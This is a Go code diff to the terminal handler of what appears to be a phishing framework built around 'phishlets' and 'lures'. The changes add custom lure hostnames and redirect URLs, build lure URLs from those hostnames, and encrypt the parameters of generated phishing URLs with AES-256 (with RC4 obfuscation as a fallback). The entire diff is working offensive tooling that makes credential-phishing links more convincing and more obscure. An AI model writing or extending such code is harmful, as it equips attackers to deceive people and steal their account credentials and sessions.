@@ -754,17 +754,54 @@ func (t *Terminal) handleLures(args []string) error {
 	if pn > 0 {
 		switch args[0] {
 		case "create":
-			if pn == 2 {
-				_, err := t.cfg.GetPhishlet(args[1])
+			if pn >= 2 {
+				pl, err := t.cfg.GetPhishlet(args[1])
 				if err != nil {
 					return err
 				}
+
+				var redirect_url string
+				var custom_hostname string
+
+				// Parse arguments
+				for i := 2; i < pn; i++ {
+					arg := args[i]
+					if arg == "--hostname" {
+						if i+1 < pn {
+							custom_hostname = args[i+1]
+							i++
+						} else {
+							return fmt.Errorf("missing value for --hostname")
+						}
+					} else if strings.HasPrefix(arg, "http://") || strings.HasPrefix(arg, "https://") {
+						redirect_url = arg
+					} else {
+						return fmt.Errorf("unknown argument: %s", arg)
+					}
+				}
+
+				// Validate custom hostname if provided
+				if custom_hostname != "" {
+					phishlet_hostname, ok := t.cfg.GetSiteDomain(pl.Name)
+					if !ok || phishlet_hostname == "" {
+						return fmt.Errorf("phishlet '%s' has no hostname configured", pl.Name)
+					}
+					if err := ValidateLureHostname(custom_hostname, phishlet_hostname); err != nil {
+						return fmt.Errorf("invalid custom hostname: %v", err)
+					}
+				}
+
 				l := &Lure{
-					Path:     "/" + GenRandomString(8),
-					Phishlet: args[1],
+					Path:           "/" + GenRandomString(8),
+					Phishlet:       args[1],
+					RedirectUrl:    redirect_url,
+					CustomHostname: custom_hostname,
 				}
 				t.cfg.AddLure(args[1], l)
 				log.Info("created lure with ID: %d", len(t.cfg.lures)-1)
+				if custom_hostname != "" {
+					log.Info("custom hostname set to: %s", custom_hostname)
+				}
 				return nil
 			}
 			return fmt.Errorf("incorrect number of arguments")
@@ -788,7 +825,9 @@ func (t *Terminal) handleLures(args []string) error {
 				}
 
 				var base_url string
-				if l.Hostname != "" {
+				if l.CustomHostname != "" {
+					base_url = "https://" + l.CustomHostname + l.Path
+				} else if l.Hostname != "" {
 					base_url = "https://" + l.Hostname + l.Path
 				} else {
 					purl, err := pl.GetLureUrl(l.Path)
@@ -1803,6 +1842,28 @@ func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phis
 func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
 	var ret string = base_url
 	if len(*params) > 0 {
+		// Convert url.Values to map[string]string for encryption
+		paramsMap := make(map[string]string)
+		for k, v := range *params {
+			if len(v) > 0 {
+				paramsMap[k] = v[0]
+			}
+		}
+
+		// Check if encryption key is set (Pro 4.2 feature)
+		encKey := t.cfg.GetEncryptionKey()
+		if encKey != "" {
+			// Use AES-256 encryption
+			encrypted, err := EncryptParams(paramsMap, encKey)
+			if err == nil {
+				// Use 'yui' parameter for encrypted data
+				ret += "?yui=" + encrypted
+				return ret
+			}
+			log.Error("failed to encrypt params: %v", err)
+		}
+
+		// Fallback to legacy RC4 method
 		key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))
 
 		enc_key := GenRandomAlphanumString(8)
